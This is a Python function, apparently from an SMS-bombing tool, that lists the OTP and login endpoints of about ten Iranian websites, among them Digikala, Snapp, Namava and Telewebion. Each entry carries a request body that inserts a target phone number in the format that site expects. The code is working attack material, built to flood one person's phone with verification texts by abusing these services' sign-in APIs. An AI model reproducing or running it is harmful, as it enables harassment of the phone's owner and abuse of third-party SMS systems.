def send_otp_requests(number):
    url_payload_map = {
        "nobat": ("https://nobat.ir/api/public/patient/login/phone", {
			"mobile": '0' + number,
		}),
        'dastaneman': ('https://dastaneman.com/User/SendCode', {'mobile': '0098' + number}),
        'snappshop': ('https://apix.snappshop.co/auth/v1/pre-login?lat=35.77331&lng=51.418591', {'mobile': '0' + number}),
        'telewebion': ('https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one', {'code': '98', 'phone': number, 'smsStatus': 'default'}),
        'namava': ('https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request', {'UserName': '+98' + number}),
        'snappapps': ('https://api.snapp.ir/api/v1/sms/link', {'phone': '0' + number}),
        'hamrahsport': ('https://hamrahsport.com/send-otp', {'cell': number, 'name': 'persian_string', 'agree': '1', 'send_otp': '1', 'otp': ''}),
        'harikashop': ('https://harikashop.com/login?back=my-account', {
            'username': '0' + number,
            'id_customer': '',
            'back': ['', 'https://harikashop.com/login?back=my-account'],
            'firstname': 'persian_string',
            'lastname': 'persian_string',
            'password': 'random_password',
            'action': 'register',
            'ajax': '1'
        }),
        'digikala': ('https://api.digikala.com/v1/user/authenticate/', {
            'backUrl': '/',
            'username': '0' + number,
            'otp_call': 'false'
        }),
        'digistyle': ('https://www.digistyle.com/users/login-register/', {
            'loginRegister[email_phone]': '0' + number,
        })
    }
    return list(url_payload_map.values())
